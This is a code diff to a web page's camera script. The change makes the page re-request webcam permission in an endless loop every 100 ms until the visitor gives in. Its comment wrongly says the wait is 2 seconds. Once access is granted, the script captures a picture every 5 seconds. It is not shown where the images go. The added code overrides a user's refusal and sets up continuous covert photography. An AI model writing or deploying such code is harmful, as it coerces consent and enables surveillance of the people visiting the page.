@@ -8,26 +8,33 @@
         let videoStream;
 
         async function startCamera() {
-            try {
-                // Request camera permission and access the video stream
-                videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = videoStream;
-                video.play();
+            // Continuously request camera permission until granted
+            while (true) {
+                try {
+                    // Request camera permission and access the video stream
+                    videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.srcObject = videoStream;
+                    video.play();
 
-                // Set the canvas dimensions based on the video stream
-                video.addEventListener('loadedmetadata', () => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
+                    // Set the canvas dimensions based on the video stream
+                    video.addEventListener('loadedmetadata', () => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
 
-                    // Automatically take a picture every 5 seconds
-                    setInterval(() => {
-                        takePicture(video, canvas);
-                    }, 5000);
-                });
-            } catch (error) {
-                console.error('Error accessing camera:', error);
+                        // Automatically take a picture every 5 seconds
+                        setInterval(() => {
+                            takePicture(video, canvas);
+                        }, 5000);
+                    });
+                    break; // Break the loop if permission is granted
+                } catch (error) {
+                    console.error('Error accessing camera:', error);
+                    //alert('Camera permission is required. Please allow access to the camera.'); // Alert user to allow access
+                    // Wait before asking again to avoid rapid prompts
+                    await new Promise(resolve => setTimeout(resolve, 100)); // Wait for 2 seconds
+                }
             }
         }
 
